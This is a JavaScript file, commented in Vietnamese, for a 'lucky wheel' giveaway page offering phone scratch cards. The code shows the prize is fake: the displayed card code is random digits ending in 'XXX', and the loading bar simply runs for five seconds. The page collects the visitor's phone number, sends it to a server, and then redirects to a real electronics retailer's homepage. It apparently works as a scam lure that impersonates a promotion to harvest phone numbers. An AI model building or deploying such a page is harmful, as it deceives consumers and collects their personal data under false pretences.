// Danh sách phần thưởng kèm hình ảnh
let prizes = [
    { text: "Thẻ Cào 50k", image: "./library/picture/50.jpg", color: "#FF5733" },  // Màu cam đỏ
    { text: "Thẻ Cào 100k", image: "./library/picture/100.jpg", color: "#33FF57" },  // Màu xanh lá
    { text: "Thẻ Cào 200k", image: "./library/picture/200k.jpeg", color: "#339FFF" },  // Màu xanh dương
    { text: "Thẻ Cào 50k", image: "./library/picture/50.jpg", color: "#FFD700" }, // Màu vàng gold
    { text: "Thẻ Cào 100k", image: "./library/picture/100.jpg", color: "#A020F0" },  // Màu tím
    { text: "Thẻ Cào 200k", image: "./library/picture/200k.jpeg", color: "#FF4500" }   // Màu đỏ cam
];


// Khởi tạo vòng quay
let myWheel = new Winwheel({
    'canvasId': 'canvas',
    'numSegments': prizes.length,
    'outerRadius': 400,
    'textFontSize': 25,
    'textfontWeight': 'thin-bold',
    'segments': prizes.map(p => ({ fillStyle: p.color, text: p.text })),
    'animation': {
        'type': 'spinToStop',
        'duration': 5,
        'spins': 8,
        'callbackFinished': function (winner) {
            showPopup(winner.text);
        }
    }
});

// Hàm hiển thị popup
function showPopup(prizeText) {
    let prize = prizes.find(p => p.text === prizeText);
    if (prize) {
        document.getElementById("prizeText").innerText = `Bạn nhận được: ${prize.text}`;
        document.getElementById("prizeImage").src = prize.image;
        document.getElementById("prizePopup").style.display = "block";
        document.getElementById('code').value = taomathe();
        // document.getElementById('spinButton').disabled = true;
    }

    EndSpinwheel()
}

// Đóng popup khi nhấn vào nút "X"
document.querySelector(".close").addEventListener("click", function () {
    document.getElementById("prizePopup").style.display = "none";
});

// Xử lý sự kiện khi nhấn nút "Quay ngay"
document.getElementById("spinButton").addEventListener("click", function () {
    if (!myWheel.animation.spinning) {
        myWheel.startAnimation();
    }

});


// nhận thưởng
document.getElementById('getPrize').addEventListener('click', function () {
    if (checksdt()) {
        startProgress(); // Hiển thị thanh tiến trình
        sendData() // Gửi số điện thoại lên server
    } else {
        alert("Vui lòng nhập số điện thoại hợp lệ");
    }
});

// kiểm tra số điện thoại
document.getElementById('sdt').addEventListener('change', function () {
    openThongbao(1);
    if (checksdt()) {
        document.getElementById('getPrize').disabled = false;
    } else {
        document.getElementById('getPrize').disabled = true;
        openThongbao(4);

    }


});

function checksdt() {
    var sdt = document.getElementById("sdt").value;
    let regex = /^(0[3|5|7|8|9])+([0-9]{8})$/;
    // Kiểm tra số điện thoại đúng đ��nh dạng theo regex
    return regex.test(sdt);
}

function sendData() {
    let sdt = document.getElementById("sdt").value;

    fetch("http://" + serverPath + "/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sdt: sdt })

    })
        .then(response => response.json())
        .then(data => {
            // console.log(data.status)
            if (data.sdt) {
                setTimeout(function () {
                    openThongbao(2);
                    document.getElementById('sdt').disabled = true;
                    document.getElementById('getPrize').disabled = true;
                    document.getElementById('getPrize').style.backgroundColor = '#2a83e9';
                    document.getElementById('getPrize').innerText = 'Thành Công';
                    reloadPage(5); // reload trang sau 5 giây

                }, 5000);

                // resetPopup();
            } else {
                setTimeout(function () {
                    openThongbao(3);
                }, 5000);
            }

        }

        )
        .catch(error => console.error("Lỗi:", error));
}
function resetPopup() {
    document.getElementById("prizePopup").style.display = "none";
    document.getElementById("prizeText").innerText = "";
    document.getElementById("prizeImage").src = "";
    document.getElementById('spinButton').disabled = true;
    document.getElementById('spinButton').text = 'Hết Lượt';
}

function startProgress() {

    let progressBar = document.getElementById("progressBarWrap");
    progressBar.classList.remove("bg-danger");
    progressBar.classList.add("bg-primary");
    document.getElementById("progressBarWrap").classList.remove("d-none");

    let width = 0;
    let time = 5000;  // 5 giây
    let intervalTime = 50; // Cập nhật mỗi 50ms
    let step = (100 / (time / intervalTime)); // Tính bước tăng %

    let interval = setInterval(function () {
        width += step;
        if (width >= 100) {
            width = 100;
            progressBar.classList.remove("bg-primary");
            progressBar.classList.add("bg-danger");
            clearInterval(interval); // Dừng khi đạt 100%
        }
        progressBar.style.width = width + "%";
        progressBar.setAttribute("aria-valuenow", width);
    }, intervalTime);

}

function openThongbao(thongbao) {

    switch (thongbao) {
        case 1:
            document.getElementById('thongbao_1').classList.remove('d-none');
            document.getElementById('thongbao_2').classList.add('d-none');
            document.getElementById('thongbao_3').classList.add('d-none');
            document.getElementById('thongbao_4').classList.add('d-none');
            break;

        case 2:
            document.getElementById('thongbao_1').classList.add('d-none');
            document.getElementById('thongbao_2').classList.remove('d-none');
            document.getElementById('thongbao_3').classList.add('d-none');
            document.getElementById('thongbao_4').classList.add('d-none');

            break;
        case 3:
            document.getElementById('thongbao_1').classList.add('d-none');
            document.getElementById('thongbao_2').classList.add('d-none');
            document.getElementById('thongbao_3').classList.remove('d-none');
            document.getElementById('thongbao_4').classList.add('d-none');
            document.getElementById('getPrize').disabled = true;
            document.getElementById('sdt').value = '';
            break;
        case 4:
            document.getElementById('thongbao_1').classList.add('d-none');
            document.getElementById('thongbao_2').classList.add('d-none');
            document.getElementById('thongbao_3').classList.add('d-none');
            document.getElementById('thongbao_4').classList.remove('d-none');
            document.getElementById('getPrize').disabled = true;
            break;
    }
    document.getElementById("progressBarWrap").classList.add("d-none");

}

function taomathe() {
    // cấu trúc mã card là aaaa-bbbb-cccc-ddd
    let result = '';
    for (let j = 0; j < 3; j++) {
        for (let i = 0; i < 4; i++) {
            result += Math.floor(Math.random() * 10); // Tạo số ngẫu nhiên từ 0 đến 9
        }
        result += ' - ';
    }
    console.log(result);
    return result += ' XXX';
}

function EndSpinwheel() {
    // debugger;
    document.getElementById('spinButton').disabled = true;
    document.getElementById('spinButton').innerText = 'Hết Lượt';
    document.getElementById('spinButton').style.backgroundColor = '#de5555';

}


// countdown


let timeLeft = 16 * 60 * 60;
let countdownDiv = document.getElementById("countDown");
let spanH = document.getElementById("hours");
let spanM = document.getElementById("minutes");
let spanS = document.getElementById("seconds");

function countdownToDate(targetDate) {
    function updateCountdown() {
        let now = new Date().getTime();
        let distance = targetDate - now;

        if (distance <= 0) {
            document.getElementById("countdown").textContent = "🎉 Chúc mừng ngày 8/3!";
            clearInterval(countdownInterval);
            return;
        }

        let totalHours = Math.floor(distance / (1000 * 60 * 60));
        let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        let seconds = Math.floor((distance % (1000 * 60)) / 1000);

        spanH.textContent = totalHours < 10 ? "0" + totalHours : totalHours;
        spanM.textContent = minutes < 10 ? "0" + minutes : minutes;
        spanS.textContent = seconds < 10 ? "0" + seconds : seconds;

    }

    updateCountdown(); // Cập nhật lần đầu tiên
    let countdownInterval = setInterval(updateCountdown, 1000);
}

// Đếm ngược đến ngày 8/3 của năm hiện tại
let targetDate = new Date(new Date().getFullYear(), 2, 8).getTime(); // Tháng 3 là index 2 -->8/3
countdownToDate(targetDate);


//slideshow
let slides = document.querySelectorAll('.slide');
let currentSlide = 0;

function changeSlide() {
    slides[currentSlide].classList.add('hidden');
    currentSlide = (currentSlide + 1) % slides.length;
    slides[currentSlide].classList.remove('hidden');
}

setInterval(changeSlide, 3000); // Chuyển slide mỗi 3 giây


function reloadPage(seconds) {
    setTimeout(function () {
        window.location.href = 'https://www.dienmayxanh.com/';
    }, seconds*1000);
}